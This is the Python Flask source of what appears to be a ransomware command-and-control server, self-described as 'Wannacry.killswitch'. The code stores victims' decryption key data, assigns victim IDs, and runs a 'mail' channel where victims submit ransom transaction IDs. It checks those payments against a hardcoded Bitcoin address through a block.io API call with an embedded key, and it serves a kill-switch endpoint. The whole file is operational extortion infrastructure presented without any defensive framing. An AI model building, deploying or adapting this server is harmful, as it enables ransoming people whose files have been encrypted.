from flask import Flask,request
import base64,time,json,string,requests,os,random

a = Flask(__name__)

def reading(file, c=''):
    content = ''
    try:
        with open(file, 'r') as f:
            content = f.readlines()
    except FileNotFoundError:return None
    except:
        try:
            with open(file, 'rb') as f:
                content = f.readlines()
        except:return None

    if c != '':
        for line in content:
            if c == line:return 1
    return 0

def writing(file,h):
  try:
    with open(file,'a') as f:f.write(f'{h}')
  except:
    with open(file,'ab') as f:f.write(f'{h}'.encode())

@a.route('/')
def index():
    return 'Wannacry.killswitch | made by hex1629'

@a.route('/logs')
def logs_recv():
    files = request.headers.get('Files-X')
    classname = request.headers.get('Class-X')
    value = request.headers.get('Value-X')
    type = request.headers.get('Type')
    locked = request.headers.get('Locked')

    data = {}
    data.update({
                "VALUE": str(value),
                "CLASSNAME": classname,
                "TYPE": type,
                "LOCKED": locked
            })
    with open(f'DECRYPT/{files}.json', 'w') as f:
      json.dump(data, f)

    return 'DONE'

@a.route('/replace')
def splits_replace():
   data = request.headers.get('X-WNCRY')
   return data.replace('_WNCRY','')

@a.route('/payment')
def payment_checker():
  username = request.headers.get('X-ID')
  value_coin = request.headers.get('X-Value')
  provided_json = {}
  with open('payment.json','r') as f:provided_json = json.loads(f.read())
  data = {key: value for key, value in provided_json.items() if key.startswith(username)}
  keys_only = list(data.keys())
  if len(keys_only) == 0:
    return 'You not pay or You not send the txid!\nI guarantee the recover for such honest customers.\nSend me a txid in contact us with this message "Txid: XXXXXXXXXX". and trying check again'
  else:
    data = requests.get(f'https://block.io/api/v2/get_raw_transaction/?api_key=5d13-ae8c-f916-6bc1&txid={provided_json[keys_only[0]]}').json()
    print(provided_json[keys_only[0]])

    outputs = [
      {"output_no": output["output_no"], "address": output["address"], "value": output["value"]}
      for output in data["data"]["outputs"]
      if output["address"] != "op_return"
  ]
    for output in outputs:
      if output['address'] == '2N9uWXtpa8P1KMFFXiy8d2Tq2x85SqY4mE4':
          if int(float(output['value'])) == int(value_coin) or int(float(output['value'])) > int(value_coin):
            return 'Good customer you need click undisabled now . . .'
          else:
            return f'Sorry you need send ${value_coin}'
    return 'Not found the address!'
def stupid_script(path):
    allFiles = []
    for root, subfiles, files in os.walk(path):
        for names in files:allFiles.append((root, names))
    return allFiles
@a.route('/path')
def path_cache():
   data = {}
   path = []
   for a in stupid_script(os.getcwd()+'/DECRYPT'):
    path.append((os.path.join(a[0],a[1]),a[1].replace('.json','')))
   for b in path:
    with open(b[0],'r') as f:
        c = json.loads(f.read())
        data[b[1]] = c
   data = dict(data)
   keys_only = list(data.keys())
   return ','.join(keys_only)

@a.route('/recover')
def recover_cache():
   data = {}
   path = []
   for a in stupid_script(os.getcwd()+'/DECRYPT'):
      path.append((os.path.join(a[0],a[1]),a[1].replace('.json','')))
   for b in path:
    with open(b[0],'r') as f:
        c = json.loads(f.read())
        data[b[1]] = c
        print(data)
    
   return json.dumps(data)

@a.route('/kill_switch')
def index_kill():
   return 'YES'

@a.route('/query_id')
def query_id():
   with open('ID.json') as f:
      a = f.read()
      id_all = json.loads(a).keys()
      data = json.loads(a)
   id = ''
   length_id = 1
   while True:
    id_temp = ''.join([random.choice((string.ascii_letters+string.digits)) for _ in range(length_id)])
    if id_temp not in id_all:
       id = id_temp
       break
    else:length_id += 1
   data[id] = 'True'
   with open('ID.json','w') as f:
      json.dump(data,f)
   return id
cache = []
@a.route('/mail')
def mail_recv():
    global cache
    id_content,content = request.headers.get('X-ID'),request.headers.get('Text')
    for a in cache:
       if a[1] == content:return 'Sorry this message has been bypass cache!'
    c = 0
    try:h = f'[{time.ctime()}] - {base64.b64decode(content.encode()).decode()}\n'
    except:return f'{id_content} Your sending empty text that wrong!'
    a = f'{id_content}.txt'
    if id_content != None:
     opt = reading(a,h)
     if opt == None:
       with open(a,'w') as f:f.write(f'Welcome ---> {id_content}\n\n')
     else:
        c = opt
     if c == 0:
      if 'Txid:' in base64.b64decode(content.encode()).decode():
        data = {}
        with open('payment.json','r') as f:
          data = json.loads(f.read())
        data[id_content] = base64.b64decode(content.encode()).decode().replace('Txid: ','')
        with open('payment.json', 'w') as f:
           json.dump(data, f)
      cache.append((id_content,content))
      writing(a,h); writing('msg.txt',f'From {id_content} '+h)
      if opt != None:
       return f'{id_content} message has been sent successfully!'
      else:return f'{id_content}🤫🧏 Msg recv successfully from server!'
     else:
      return f'{id_content} message has been match before!\n{"  "*len(id_content)} Oh Sorry That From My Script!'
    else:
     return "We can't process your username!"

a.run(host='0.0.0.0',port=8080)
